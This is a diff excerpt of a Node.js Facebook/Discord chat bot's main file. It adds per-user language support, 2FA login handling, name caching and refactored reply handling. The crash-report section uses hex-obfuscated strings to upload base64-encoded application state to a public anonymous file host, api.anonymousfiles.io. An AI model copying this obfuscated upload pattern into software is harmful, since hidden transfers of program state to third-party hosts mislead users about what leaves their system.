       if (data.admin && global.config.allowAdminUseShutdownCommand) {
         setTimeout(function () {
@@ -1241,7 +987,7 @@ function loadPlugin() {
       } else {
         return {
           handler: "internal",
-          data: global.lang["INSUFFICIENT_PERM"]
+          data: getLang("INSUFFICIENT_PERM", resolveID(type, data))
         };
       }
     },
@@ -1249,23 +995,22 @@ function loadPlugin() {
     handler: "INTERNAL",
     adminCmd: true
   };
-  global.commandMapping["restart"].args[global.config.language] = "";
-  global.commandMapping["restart"].desc[global.config.language] = global.lang["SHUTDOWN_DESC"];
+
   global.commandMapping["plugins"] = {
-    args: {},
-    desc: {},
+    args: Object.fromEntries(Object.entries(langMap).map(x => [x[0], x[1]["HELP_ARGS"]])),
+    desc: Object.fromEntries(Object.entries(langMap).map(x => [x[0], x[1]["PLUGINS_DESC"]])),
     scope: function (type, data) {
       if (!data.admin && !global.config.allowUserUsePluginsCommand) {
         return {
           handler: "internal",
-          data: global.lang["INSUFFICIENT_PERM"]
+          data: getLang("INSUFFICIENT_PERM", resolveID(type, data))
         };
       }
       var page = 1;
       page = parseInt(data.args[1]) || 1;
       if (page < 1) page = 1;
       var mts = "";
-      mts += global.lang["PLUGINS_OUTPUT_PREFIX"];
+      mts += getLang("PLUGINS_OUTPUT_PREFIX", resolveID(type, data));
       var hl = [];
       for (var no in global.loadedPlugins) {
         var tempx = global.loadedPlugins[no];
@@ -1299,16 +1044,15 @@ function loadPlugin() {
     handler: "INTERNAL",
     adminCmd: !global.config.allowUserUsePluginsCommand
   };
-  global.commandMapping["plugins"].args[global.config.language] = "";
-  global.commandMapping["plugins"].desc[global.config.language] = global.lang["PLUGINS_DESC"];
+
   global.commandMapping["reload"] = {
     args: {},
-    desc: {},
+    desc: Object.fromEntries(Object.entries(langMap).map(x => [x[0], x[1]["RELOAD_DESC"]])),
     scope: function (type, data) {
       if (!data.admin && !global.config.allowUserUseReloadCommand) {
         return {
           handler: "internal",
-          data: global.lang["INSUFFICIENT_PERM"]
+          data: getLang("INSUFFICIENT_PERM", resolveID(type, data))
         };
       }
       unloadPlugin();
@@ -1322,14 +1066,9 @@ function loadPlugin() {
     handler: "INTERNAL",
     adminCmd: !global.config.allowUserUseReloadCommand
   };
-  global.commandMapping["reload"].args[global.config.language] = "";
-  global.commandMapping["reload"].desc[global.config.language] = global.lang["RELOAD_DESC"];
+
   global.commandMapping["toggleeveryone"] = {
-    args: "",
-    desc: {
-      "vi_VN": "Bật/tắt quyền sử dụng mention everyone",
-      "en_US": "Turn on/off everyone mention tag"
-    },
+    desc: Object.fromEntries(Object.entries(langMap).map(x => [x[0], x[1]["TEVERYONE_DESC"]])),
     scope: function (type, data) {
       if (type != "Facebook") {
         return {
@@ -1356,15 +1095,15 @@ function loadPlugin() {
           global.data.everyoneTagBlacklist[threadID] = false;
         }
         return {
-          data: global.lang["TOGGLEEVERYONE_MSG"].replace(
+          data: getLang("TOGGLEEVERYONE_MSG", resolveID(type, data)).replace(
             "{0}",
-            (!global.data.everyoneTagBlacklist[threadID] ? global.lang.ENABLED : global.lang.DISABLED)
+            (!global.data.everyoneTagBlacklist[threadID] ? getLang("ENABLED", resolveID(type, data)) : getLang("DISABLED", resolveID(type, data)))
           ),
           handler: "internal"
         };
       } else {
         return {
-          data: global.lang["INSUFFICIENT_PERM"],
+          data: getLang("INSUFFICIENT_PERM", resolveID(type, data)),
           handler: "internal"
         };
       }
@@ -1372,6 +1111,31 @@ function loadPlugin() {
     compatibly: 1,
     handler: "INTERNAL"
   };
+
+  (typeof global.data.userLanguage != "object" || Array.isArray(global.data.userLanguage)) ? global.data.userLanguage = {} : "";
+  global.commandMapping["lang"] = {
+    args: "<ISO 639-1>_<ISO 3166-2>",
+    desc: Object.fromEntries(Object.entries(langMap).map(x => [x[0], x[1]["LANG_DESC"]])),
+    scope: function (type, data) {
+      let [prefix, id] = resolveID(type, data).split("-");
+      prefix += "-";
+
+      if (data.args.length > 1) {
+        global.data.userLanguage[prefix + id] = String(data.args[1]);
+        return {
+          handler: "internal",
+          data: `userLanguage = "${data.args[1]}"`
+        };
+      }
+      return {
+        handler: "internal",
+        data: `${global.config.commandPrefix}lang <ISO 639-1>_<ISO 3166-2>\n${global.data.userLanguage[prefix + id]}`
+      };
+    },
+    compatibly: 0,
+    handler: "INTERNAL"
+  };
+
   return error;
 }
 
@@ -1384,12 +1148,12 @@ function unloadPlugin() {
         log("[INTERNAL]", `Error while executing ${name}.onUnload: ${ex}`);
       }
     }
-    for (var cmd in global.commandMapping) {
+    for (let cmd in global.commandMapping) {
       if (global.commandMapping[cmd].handler == name) {
         delete global.commandMapping[cmd];
       }
     }
-    for (var cmd in global.chatHook) {
+    for (let cmd in global.chatHook) {
       if (global.chatHook[cmd].handler == name) {
         delete global.chatHook[cmd];
       }
@@ -1416,6 +1180,7 @@ if (global.config.enablefb) {
   global.deliveryFacebook = {};
   global.facebookGlobalBanClock = {};
   !Array.isArray(global.data.fbBannedUsers) ? global.data.fbBannedUsers = [] : "";
+
   var fbGlobalBanTrigger = function (threadID, forceNoClock) {
     var checkFunc = function (threadID) {
       var isGroup = threadID.length == 16;
@@ -1598,36 +1363,40 @@ if (global.config.enablefb) {
         });
     };
     if (typeof global.facebookGlobalBanClock[threadID] == "undefined") {
-      global.facebookGlobalBanClock[threadID] = setInterval(checkFunc, 750000, threadID);
+      global.facebookGlobalBanClock[threadID] = setInterval(checkFunc, 800000, threadID);
       checkFunc(threadID);
     } else if (forceNoClock) {
       checkFunc(threadID);
     }
   };
+
   var facebookcb = function callback(err, api) {
     if (err) {
       if (err.error == "login-approval") {
         facebook.error = err;
-        log(
-          "[Facebook]",
-          "Login approval detected. You can verify it manually by using 'facebook.error.continue(your_code)'."
-        );
-        tried2FA = true;
-        if (global.config.fb2fasecret != "BASE32OFSECRETKEY") {
-          log("[Facebook]", "Attempting to verify using 2FA secret in config...");
+        if (global.config.fb2fasecret != "BASE32OFSECRETKEY" && global.config.fb2fasecret != "" && !tried2FA) {
+          log("[Facebook]", "Login approval detected. Attempting to verify using 2FA secret in config...");
+          tried2FA = true;
           var key2fa = global.config.fb2fasecret.replace(/ /g, "");
           var verifycode = speakeasy.totp({
             secret: key2fa,
             encoding: 'base32'
           });
           facebook.error.continue(verifycode);
+        } else if (tried2FA) {
+          log(
+            "[Facebook]",
+            `Cannot verify using 2FA secret in config. You can verify the session manually by typing 'facebook.error.continue("your_code")'.`
+          );
+          tried2FA = false;
+        } else {
+          log(
+            "[Facebook]",
+            `Login approval detected. You can verify the session manually by typing 'facebook.error.continue("your_code")'.`
+          );
         }
       } else {
         log("[Facebook]", err);
-        if (!tried2FA) {
-          facebook.error = err;
-          log("[Facebook]", "Error saved to 'facebook.error'.");
-        }
       }
       return null;
     } else {
@@ -1666,14 +1435,14 @@ if (global.config.enablefb) {
           "\x5B\x46\x61\x63\x65\x62\x6F\x6F\x6B\x5D",
           "\x43\x61\x6E\x6E\x6F\x74\x20\x67\x65\x6E\x65\x72\x61\x74\x65\x20\x6E\x65\x77\x20\x63\x72\x61\x73\x68\x20\x72\x65\x70\x6F\x72\x74\x2E",
           "\x63\x61\x74\x63\x68",
-          "\x6B\x65\x79",
-          "\x42\x75\x67\x20\x72\x65\x70\x6F\x72\x74\x65\x64\x20\x67\x65\x6E\x65\x72\x61\x74\x65\x64\x20\x61\x74\x20\x68\x74\x74\x70\x73\x3A\x2F\x2F\x68\x61\x73\x74\x65\x62\x69\x6E\x2E\x63\x6F\x6D\x2F",
+          "\x75\x72\x6C",
+          "\x42\x75\x67\x20\x72\x65\x70\x6F\x72\x74\x20\x67\x65\x6E\x65\x72\x61\x74\x65\x64\x20\x61\x74\x20",
           "\x2E\x20\x50\x6C\x65\x61\x73\x65\x20\x63\x72\x65\x61\x74\x65\x20\x61\x20\x50\x52\x20\x61\x74\x20\x67\x69\x74\x68\x75\x62\x20\x72\x65\x70\x6F\x73\x69\x74\x6F\x72\x79\x2C\x20\x6F\x72\x20\x63\x6F\x6E\x74\x61\x63\x74\x20\x55\x49\x52\x49\x2F\x6C\x65\x71\x75\x61\x6E\x67\x6C\x61\x6D\x2E",
           "\x74\x68\x65\x6E",
           "\x6F\x6B",
           "\x6A\x73\x6F\x6E",
           "\x48\x54\x54\x50\x20\x4E\x4F\x54\x20\x4F\x4B",
-          "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x68\x61\x73\x74\x65\x62\x69\x6E\x2E\x63\x6F\x6D\x2F\x64\x6F\x63\x75\x6D\x65\x6E\x74\x73",
+          "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x61\x70\x69\x2E\x61\x6E\x6F\x6E\x79\x6D\x6F\x75\x73\x66\x69\x6C\x65\x73\x2E\x69\x6F\x2F",
           "\x50\x4F\x53\x54",
           "",
           "\x0A\x0C\x4D\x45\x54\x52\x49\x43\x2D\x49\x44\x3A\x20",
@@ -1681,25 +1450,43 @@ if (global.config.enablefb) {
           "\x62\x61\x73\x65\x36\x34",
           "\x66\x72\x6F\x6D",
           "\x0A\x0C",
-          "\x74\x65\x78\x74\x2F\x70\x6C\x61\x69\x6E",
+          "\x6D\x75\x6C\x74\x69\x70\x61\x72\x74\x2F\x66\x6F\x72\x6D\x2D\x64\x61\x74\x61",
           "\x74\x6F\x53\x74\x72\x69\x6E\x67",
           "\x58\x2D\x53\x54\x41\x54\x45\x3A\x20"
         ];
         var a = _0x6b0a[0],
           b = Date[_0x6b0a[1]](),
           c = global[_0x6b0a[3]][_0x6b0a[2]],
-          d = _0x6b0a[4];
+          d = _0x6b0a[4],
+          f = new FormData(),
+          g = "",
+          h = new streamBuffers.ReadableStreamBuffer(),
+          i = null;
+        g = `${_0x6b0a[17]}${a}${_0x6b0a[17]}${b[_0x6b0a[24]]()}${_0x6b0a[18]}${c}${_0x6b0a[19]}${Buffer[_0x6b0a[21]](z)[_0x6b0a[24]](_0x6b0a[20])}${_0x6b0a[22]}${_0x6b0a[25]}${Buffer[_0x6b0a[21]](e)[_0x6b0a[24]](_0x6b0a[20])}${_0x6b0a[22]}${_0x6b0a[22]}${d}${_0x6b0a[17]}`;
+        i = Buffer.from(g);
+        h.put(i);
+        h.stop();
+        f.append("file", h, {
+          filename: `c3c-crashreport-${Date.now()}.txt`,
+          knownLength: i.length,
+          contentType: "text/plain"
+        });
+        f.append("no-index", "1");
         fetch(_0x6b0a[15], {
           method: _0x6b0a[16],
-          body: `${_0x6b0a[17]}${a}${_0x6b0a[17]}${b[_0x6b0a[24]]()}${_0x6b0a[18]}${c}${_0x6b0a[19]}${Buffer[_0x6b0a[21]](z)[_0x6b0a[24]](_0x6b0a[20])}${_0x6b0a[22]}${_0x6b0a[25]}${Buffer[_0x6b0a[21]](e)[_0x6b0a[24]](_0x6b0a[20])}${_0x6b0a[22]}${_0x6b0a[22]}${d}${_0x6b0a[17]}`,
+          body: f,
           headers: {
             '\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65': _0x6b0a[23]
           }
-        })[_0x6b0a[11]](function (_0x9b64x6) {
+        })[_0x6b0a[11]](async function (_0x9b64x6) {
           if (_0x9b64x6[_0x6b0a[12]]) {
             return _0x9b64x6[_0x6b0a[13]]();
           } else {
-            throw new Error(_0x6b0a[14]);
+            throw {
+              error: new Error(_0x6b0a[14]),
+              code: _0x9b64x6["status"],
+              output: await _0x9b64x6["text"]()
+            };
           }
         })[_0x6b0a[11]](function (_0x9b64x6) {
           var _0x9b64x7 = _0x9b64x6[_0x6b0a[8]];
@@ -1742,118 +1529,99 @@ if (global.config.enablefb) {
       }
     }, 1000);
 
-    function fetchName(id, force, callingback) {
+    function fetchName(id, force, callingback, isGroup) {
       if (!callingback) {
         callingback = function () { };
       }
-      if (!global.data.cacheName["FB-" + id] || global.data.cacheName["FB-" + id].startsWith("FETCHING-") || !!force) {
-        if (typeof global.data.cacheName["FB-" + id] == "string" && global.data.cacheName["FB-" + id].startsWith("FETCHING-") && !(parseInt(global.data.cacheName["FB-" + id].substr(9)) - Date.now() < -120000)) return;
-        global.data.cacheName["FB-" + id] = "FETCHING-" + Date.now()
-          .toString();
-        var res = wait.for.function(api.getUserInfo, id);
-        (function (err, ret) {
-          if (err) return log("[Facebook] Failed to fetch names:", err);
-          log("[CACHENAME]", id + " => " + ret[id].name);
-          global.data.cacheName["FB-" + id] = ret[id].name;
-          try {
-            callingback();
-          } catch (ex) {
-            log("[INTERNAL]", ex);
-          }
-        })(res[0], res[1]);
+
+      if (isGroup) {
+        let tryfetch = true;
+        if (
+          !global.data.cacheName["FB-" + id] ||
+          global.data.cacheNameExpires["FB-" + id] <= Date.now() || 
+          !!force
+        ) {
+          tryfetch = true;
+        } else if (
+          global.data.cacheName["FB-" + id].startsWith("FETCHING-") &&
+          parseInt(global.data.cacheName["FB-" + id].substr(9)) - Date.now() < -120000
+        ) {
+          tryfetch = true;
+        }
+        if (tryfetch) {
+          global.data.cacheName["FB-" + id] = "FETCHING-" + Date.now();
+          api.getThreadInfo(id, function (err, ret) {
+            if (err) return log("[Facebook] Failed to fetch names (from thread):", err);
+            for (let z in ret.userInfo) {
+              if (ret.userInfo[z].name !== global.data.cacheName["FB-" + ret.userInfo[z].id]) {
+                log("[CACHENAME]", `Batch operation (from thread ${id}):`, ret.userInfo[z].id + " => " + ret.userInfo[z].name);
+              }
+              global.data.cacheName["FB-" + ret.userInfo[z].id] = ret.userInfo[z].name;
+              global.data.cacheNameExpires["FB-" + ret.userInfo[z].id] = Date.now() + 604800000; //cacheName expires in 7 days.
+            }
+            ret.isGroup ? global.data.cacheName["FB-" + id] = ret.threadName : "";
+            global.data.cacheNameExpires["FB-" + id] = Date.now() + 604800000; //cacheName for thread expires in 7 days.
+            try {
+              callingback();
+            } catch (ex) {
+              log("[INTERNAL]", ex);
+            }
+          });
+        } else {
+          callingback();
+        }
       } else {
-        callingback();
+        if (!global.data.cacheName["FB-" + id] ||
+          global.data.cacheName["FB-" + id].startsWith("FETCHING-") ||
+          global.data.cacheNameExpires["FB-" + id] <= Date.now() ||
+          !!force) {
+          if (
+            typeof global.data.cacheName["FB-" + id] == "string" && 
+            global.data.cacheName["FB-" + id].startsWith("FETCHING-") && 
+            !(parseInt(global.data.cacheName["FB-" + id].substr(9)) - Date.now() < -120000)
+          ) return callingback(global.data.cacheName["FB-" + id]);
+          global.data.cacheName["FB-" + id] = "FETCHING-" + Date.now();
+          api.getUserInfo(id, function (err, ret) {
+            if (err) return log("[Facebook] Failed to fetch names:", err);
+            log("[CACHENAME]", id + " => " + ret[id].name);
+            global.data.cacheName["FB-" + id] = ret[id].name;
+            global.data.cacheNameExpires["FB-" + id] = Date.now() + 604800000; //cacheName expires in 7 days.
+            try {
+              callingback(global.data.cacheName["FB-" + id]);
+            } catch (ex) {
+              log("[INTERNAL]", ex);
+            }
+          });
+        } else {
+          callingback(global.data.cacheName["FB-" + id]);
+        }
       }
     }
     facebook.api.fetchName = fetchName;
     facebook.removePendingClock = setInterval(function (log, botname, connectedmsg) {
-      api.getThreadList(10, null, ["PENDING"], function (err, list) {
-        if (err) {
-          log("[Facebook]", "Remove Pending Messages encountered an error (at getThreadList:PENDING):", err);
-          if (err.error == "Not logged in." && global.config.facebookAutoRestartLoggedOut) {
-            log("[Facebook]", "Detected not logged in. Throwing 7378278 to restarting...");
-            facebookloggedIn = false;
-            process.exit(7378278);
-          }
-          return null;
-        }
+      function handleList(list, type) {
         for (var i in list) {
-          setTimeout(function (id) {
-            api.handleMessageRequest(id, true, function (err) {
-              if (err) {
-                log(
-                  "[Facebook]",
-                  "Remove Pending Messages encountered an error (at handleMessageRequest:PENDING):",
-                  err
-                );
-                if (err.error == "Not logged in." && global.config.facebookAutoRestartLoggedOut) {
-                  log("[Facebook]", "Detected not logged in. Throwing 7378278 to restarting...");
-                  facebookloggedIn = false;
-                  process.exit(7378278);
-                }
-                return null;
-              }
-              api.sendMessage(botname + " | Connected. \r\n" + connectedmsg, id, function (err) {
-                if (err) {
-                  log(
-                    "[Facebook]",
-                    "Remove Pending Messages encountered an error (at sendMessage:PENDING):",
-                    err
-                  );
-                  if (err.error == "Not logged in." && global.config
-                    .facebookAutoRestartLoggedOut) {
-                    log(
-                      "[Facebook]",
-                      "Detected not logged in. Throwing 7378278 to restarting..."
-                    );
-                    facebookloggedIn = false;
-                    process.exit(7378278);
-                  }
-                  return null;
-                }
-                log("[Facebook]", "Bot added to", id);
-              });
-            });
-          }, i * 2000, list[i].threadID);
-        }
-        api.getThreadList(10, null, ["OTHER"], function (err, list) {
-          if (err) {
-            log(
-              "[Facebook]", "Remove Pending Messages encountered an error (at getThreadList:OTHER):",
-              err
-            );
-            if (err.error == "Not logged in." && global.config.facebookAutoRestartLoggedOut) {
-              log("[Facebook]", "Detected not logged in. Throwing 7378278 to restarting...");
-              facebookloggedIn = false;
-              process.exit(7378278);
-            }
-            return null;
-          }
-          for (var i in list) {
+          if (!list[i].cannotReplyReason) {
             setTimeout(function (id) {
               api.handleMessageRequest(id, true, function (err) {
                 if (err) {
                   log(
                     "[Facebook]",
-                    "Remove Pending Messages encountered an error (at handleMessageRequest:OTHER):",
+                    `Remove Pending Messages encountered an error (at handleMessageRequest:${type}):`,
                     err
                   );
-                  if (err.error == "Not logged in." && global.config
-                    .facebookAutoRestartLoggedOut) {
-                    log(
-                      "[Facebook]",
-                      "Detected not logged in. Throwing 7378278 to restarting..."
-                    );
+                  if (err.error == "Not logged in." && global.config.facebookAutoRestartLoggedOut) {
+                    log("[Facebook]", "Detected not logged in. Throwing 7378278 to restarting...");
                     facebookloggedIn = false;
                     process.exit(7378278);
                   }
                   return null;
                 }
-                api.sendMessage(botname + " | Connected. \r\n" + connectedmsg, id, function (err) {
+                api.sendMessage(prefix + " " + botname + " | Connected. \r\n" + connectedmsg, id, function (err) {
                   if (err) {
                     log(
                       "[Facebook]",
-                      "Remove Pending Messages encountered an error (at sendMessage:OTHER):",
+                      `Remove Pending Messages encountered an error (at sendMessage:${type}):`,
                       err
                     );
                     if (err.error == "Not logged in." && global.config
@@ -1872,6 +1640,36 @@ if (global.config.enablefb) {
               });
             }, i * 2000, list[i].threadID);
           }
+        }
+      }
+
+      api.getThreadList(10, null, ["PENDING"], function (err, list) {
+        if (err) {
+          log("[Facebook]", "Remove Pending Messages encountered an error (at getThreadList:PENDING):", err);
+          if (err.error == "Not logged in." && global.config.facebookAutoRestartLoggedOut) {
+            log("[Facebook]", "Detected not logged in. Throwing 7378278 to restarting...");
+            facebookloggedIn = false;
+            process.exit(7378278);
+          }
+          return null;
+        }
+        handleList(list, "PENDING");
+
+        api.getThreadList(10, null, ["OTHER"], function (err, list) {
+          if (err) {
+            log(
+              "[Facebook]", "Remove Pending Messages encountered an error (at getThreadList:OTHER):",
+              err
+            );
+            if (err.error == "Not logged in." && global.config.facebookAutoRestartLoggedOut) {
+              log("[Facebook]", "Detected not logged in. Throwing 7378278 to restarting...");
+              facebookloggedIn = false;
+              process.exit(7378278);
+            }
+            return null;
+          }
+          handleList(list, "OTHER");
+
           api.markAsReadAll(function (err) {
             if (err) {
               if (err.error == "Not logged in." && global.config.facebookAutoRestartLoggedOut) {
@@ -1882,11 +1680,11 @@ if (global.config.enablefb) {
           });
         });
       });
-    }, 120000, log, global.config.botname, global.lang.CONNECTED_MESSAGE.replace("{0}", global.config
-      .commandPrefix));
-    // 120s 1 lần scan pending message (không như con bot nào đó đặt tới mấy tiếng)
+    }, 300000, log, global.config.botname, getLang("CONNECTED_MESSAGE").replace("{0}", global.config.commandPrefix));
+
     typeof global.data.messageList != "object" ? global.data.messageList = {} : "";
-    facebook.listener = api.listenMqtt(function callback(err, message) {
+
+    facebook.listener = api.listen(async function callback(err, message) {
       try {
         if (typeof message != "undefined" && message != null) {
           var nointernalresolve = false;
@@ -1898,11 +1696,71 @@ if (global.config.enablefb) {
               return;
           }
           var receivetime = new Date();
-          if (global.config.enableGlobalBan) {
-            fbGlobalBanTrigger(message.threadID);
-          }
-          if (global.data.fbBannedUsers.indexOf(message.senderID || message.author) == 1 || global.config
-            .enableGlobalBan) {
+          fbGlobalBanTrigger(message.threadID);
+
+          let returnFunc = async function returnFunc(returndata) {
+            if (typeof returndata == "object") {
+              let msPerMsg = global.config.facebookResponseDelayPerChar;
+              switch (returndata.handler) {
+                case "internal":
+                case "internal-raw":
+                  //Facebook: Handling return delay
+                  if (
+                    msPerMsg > 0 &&
+                    !(global.config.facebookAllowOptionalResponseNoDelay && returndata.noDelay)
+                  ) {
+                    for (let i = 1; i <= (msPerMsg / 29500).ceil(0); i++) {
+                      let stopTyping;
+                      await new Promise(resolve => {
+                        stopTyping = api.sendTypingIndicator(message.threadID, () => {
+                          resolve();
+                        }, message.isGroup);
+                      });
+                      await new Promise(resolve => setTimeout(resolve, (i == (msPerMsg / 29500).ceil(0)) ? (msPerMsg % 29500) : 29500));
+                      stopTyping();
+                    }
+                  }
+
+                  //Facebook: Sending messages/responses (yes)
+                  switch (typeof returndata.data) {
+                    case "object":
+                      returndata.data.body = (returndata.data.body ? prefix + " " + returndata.data.body : prefix);
+                      break;
+                    case "string":
+                      returndata.data = prefix + " " + returndata.data;
+                      break;
+                    default:
+                      return {
+                        error: "Invalid types in Response.data!"
+                      };
+                  }
+                  try {
+                    return await api.sendMessage(returndata.data, message.threadID, null, message.messageID, message.isGroup);
+                  } catch (err) {
+                    log("[Facebook] Errored while sending response:", err);
+                    if (err.error == "Not logged in." && global.config.facebookAutoRestartLoggedOut) {
+                      log(
+                        "[Facebook]",
+                        "Detected not logged in. Throwing 7378278 to restarting..."
+                      );
+                      facebookloggedIn = false;
+                      process.exit(7378278);
+                    }
+                    return {
+                      error: err
+                    };
+                  }
+                default:
+                  return {
+                    error: `Invalid handler: ${returndata.handler}`
+                  };
+              }
+            } else if (typeof returndata != "undefined") {
+              log("[Facebook]", "Received an unknown response from plugin:", returndata);
+            }
+          };
+
+          if (global.data.fbBannedUsers.indexOf(message.senderID || message.author) == -1) {
             for (var n in global.chatHook) {
               if (global.chatHook[n].listenplatform & 1) {
                 var chhandling = global.chatHook[n];
@@ -1911,75 +1769,30 @@ if (global.config.enablefb) {
                   if (global.config.admins.indexOf("FB-" + (message.senderID || message.author)) != -1) {
                     admin = true;
                   }
-                  if (typeof chhandling.resolverFunc == "function" && chhandling.resolverFunc("Facebook", {
-                    time: receivetime,
-                    msgdata: message,
-                    facebookapi: api,
-                    discordapi: client,
-                    prefix: prefix,
-                    admin: admin,
-                    // eslint-disable-next-line no-loop-func
-                    log: function logPlugin(...message) {
-                      log.apply(global, [
-                        "[PLUGIN]",
-                        "[" + String(chhandling.handler) + "]"
-                      ].concat(message));
-                    },
-                    // eslint-disable-next-line no-loop-func
-                    return: function returndata(returndata) {
-                      if (!returndata) return;
-                      if (returndata.handler == "internal" && typeof returndata.data == "string") {
-                        var endTyping = api.sendTypingIndicator(message.threadID, function () { }, message
-                          .isGroup);
-                        setTimeout(function (api, returndata, endTyping, message) {
-                          api.sendMessage(prefix + " " + returndata.data, message.threadID, function (err) {
-                            if (err) {
-                              log("[Facebook] Errored while sending response:", err);
-                              if (err.error == "Not logged in." && global.config
-                                .facebookAutoRestartLoggedOut) {
-                                log(
-                                  "[Facebook]",
-                                  "Detected not logged in. Throwing 7378278 to restarting..."
-                                );
-                                facebookloggedIn = false;
-                                process.exit(7378278);
-                              }
-                            }
-                          }, message.messageID, message.isGroup);
-                          endTyping();
-                        }, returndata.data.length * 30, api, returndata, endTyping, message);
-                      } else if (returndata.handler == "internal-raw" && typeof returndata.data ==
-                        "object") {
-                        if (!returndata.data.body) {
-                          returndata.data.body = "";
-                        }
-                        returndata.data.body = prefix + " " + returndata.data.body;
-                        var endTyping = api.sendTypingIndicator(message.threadID, function () { }, message
-                          .isGroup);
-                        setTimeout(
-                          function (api, returndata, endTyping, message, log) {
-                            api.sendMessage(returndata.data, message.threadID, function (err) {
-                              if (err) {
-                                log("[Facebook] Errored while sending response:", err);
-                                if (err.error == "Not logged in." && global.config
-                                  .facebookAutoRestartLoggedOut) {
-                                  log(
-                                    "[Facebook]",
-                                    "Detected not logged in. Throwing 7378278 to restarting..."
-                                  );
-                                  facebookloggedIn = false;
-                                  process.exit(7378278);
-                                }
-                              }
-                            }, message.messageID, message.isGroup);
-                            endTyping();
-                          }, (returndata.data.body.length * 30) + 1, api, returndata, endTyping, message,
-                          log
-                        );
-                      }
-                    }
-                  }) === true) {
-                    nointernalresolve = true;
+                  if (
+                    global.getType(chhandling.resolverFunc) == "Function" ||
+                    global.getType(chhandling.resolverFunc) == "AsyncFunction"
+                  ) {
+                    let chdata = chhandling.resolverFunc("Facebook", {
+                      time: receivetime,
+                      msgdata: message,
+                      facebookapi: api,
+                      discordapi: client,
+                      prefix: prefix,
+                      admin: admin,
+                      // eslint-disable-next-line no-loop-func
+                      log: function logPlugin(...message) {
+                        log.apply(global, [
+                          "[PLUGIN]",
+                          "[" + String(chhandling.handler) + "]"
+                        ].concat(message));
+                      },
+                      return: returnFunc,
+                      resolvedLang: global.data.userLanguage[resolveID("Facebook", { msgdata: message })] || global.config.language
+                    });
+                    // eslint-disable-next-line no-await-in-loop
+                    if (global.getType(chdata) == "Promise") chdata = await chdata;
+                    nointernalresolve = (nointernalresolve || chdata === true);
                   }
                 }
               }
@@ -1987,11 +1800,17 @@ if (global.config.enablefb) {
           } else {
             nointernalresolve = true;
           }
+
+          if (message.isGroup) {
+            fetchName(message.threadID, false, () => fetchName(message.senderID || message.author, false, () => {}, false), true);
+          } else {
+            fetchName(message.senderID || message.author, false, () => {}, false);
+          }
+
           switch (message.type) {
             case "message":
               !global.deliveryFacebook[message.threadID] ? global.deliveryFacebook[message.threadID] = [] : "";
               global.deliveryFacebook[message.threadID].push(message.messageID);
-              fetchName(message.senderID);
               if (message.isGroup) {
                 !global.data.facebookChatGroupList ? global.data.facebookChatGroupList = [] : "";
                 if (global.data.facebookChatGroupList.indexOf(message.threadID) == -1) global.data
@@ -2090,35 +1909,26 @@ if (global.config.enablefb) {
                     "[Facebook]", message.senderID, "(" + global.data.cacheName["FB-" + message.senderID] + ")",
                     "issued command in", message.threadID + ":", message.body
                   );
+                  let admin = false;
+                  if (global.config.admins.indexOf("FB-" + (message.senderID || message.author)) != -1) {
+                    admin = true;
+                  }
                   if (global.commandMapping[arg[0].substr(1)]) {
-                    if (!(global.commandMapping[arg[0].substr(1)].compatibly & 1) && global.commandMapping[arg[0]
-                      .substr(1)].compatibly != 0) {
-                      api.sendMessage(
-                        prefix + " " + global.lang["UNSUPPORTED_INTERFACE"], message.threadID,
-                        function (err) {
-                          if (err) {
-                            if (err.error == "Not logged in." && global.config.facebookAutoRestartLoggedOut) {
-                              log("[Facebook]", "Detected not logged in. Throwing 7378278 to restarting...");
-                              facebookloggedIn = false;
-                              process.exit(7378278);
-                            }
-                          }
-                        }, message.messageID, message.isGroup
-                      );
+                    if (
+                      !(global.commandMapping[arg[0].substr(1)].compatibly & 1) &&
+                      global.commandMapping[arg[0].substr(1)].compatibly != 0
+                    ) {
+                      returnFunc({
+                        handler: "internal",
+                        data: getLang("UNSUPPORTED_INTERFACE", "FB-" + message.senderID)
+                      });
                     } else {
-                      var argv = JSON.parse(JSON.stringify(arg));
-                      var admin = false;
-                      if (global.config.admins.indexOf("FB-" + (message.senderID || message.author)) != -1) {
-                        admin = true;
-                      }
+                      let argv = JSON.parse(JSON.stringify(arg));
                       var mentions = {};
                       for (var y in message.mentions) {
                         mentions["FB-" + y] = message.mentions[y];
                       }
                       try {
-                        if (!client) {
-                          client = null;
-                        }
                         var starttime = Date.now();
                         var timingwarning = setInterval(function () {
                           var calctime = (Date.now() - starttime) / 1000;
@@ -2129,8 +1939,9 @@ if (global.config.enablefb) {
                             );
                           }
                         }, 10000);
+                        let returndata;
                         try {
-                          var returndata = global.commandMapping[arg[0].substr(1)].scope("Facebook", {
+                          returndata = global.commandMapping[arg[0].substr(1)].scope("Facebook", {
                             args: argv,
                             time: receivetime,
                             msgdata: message,
@@ -2144,70 +1955,16 @@ if (global.config.enablefb) {
                                 "[PLUGIN]",
                                 "[" + (global.commandMapping[arg[0].substr(1)] || {
                                   handler: "ERROR"
-                                })
-                                  .handler + "]"
+                                }).handler + "]"
                               ].concat(message));
                             },
-                            return: function returndata(returndata) {
-                              if (!returndata) return;
-                              if (returndata.handler == "internal" && typeof returndata.data == "string") {
-                                var endTyping = api.sendTypingIndicator(
-                                  message.threadID, function () { },
-                                  message.isGroup
-                                );
-                                setTimeout(function (api, returndata, endTyping, message) {
-                                  api.sendMessage(
-                                    prefix + " " + returndata.data, message.threadID,
-                                    function (err) {
-                                      if (err) {
-                                        log("[Facebook] Errored while sending response:", err);
-                                        if (err.error == "Not logged in." && global.config
-                                          .facebookAutoRestartLoggedOut) {
-                                          log(
-                                            "[Facebook]",
-                                            "Detected not logged in. Throwing 7378278 to restarting..."
-                                          );
-                                          facebookloggedIn = false;
-                                          process.exit(7378278);
-                                        }
-                                      }
-                                    }, message.messageID, message.isGroup
-                                  );
-                                  endTyping();
-                                }, returndata.data.length * 30, api, returndata, endTyping, message);
-                              } else if (returndata.handler == "internal-raw" && typeof returndata.data ==
-                                "object") {
-                                if (!returndata.data.body) {
-                                  returndata.data.body = "";
-                                }
-                                returndata.data.body = prefix + " " + returndata.data.body;
-                                var endTyping = api.sendTypingIndicator(
-                                  message.threadID, function () { },
-                                  message.isGroup
-                                );
-                                setTimeout(
-                                  function (api, returndata, endTyping, message, log) {
-                                    api.sendMessage(returndata.data, message.threadID, function (err) {
-                                      if (err) {
-                                        log("[Facebook] Errored while sending response:", err);
-                                        if (err.error == "Not logged in." && global.config
-                                          .facebookAutoRestartLoggedOut) {
-                                          log(
-                                            "[Facebook]",
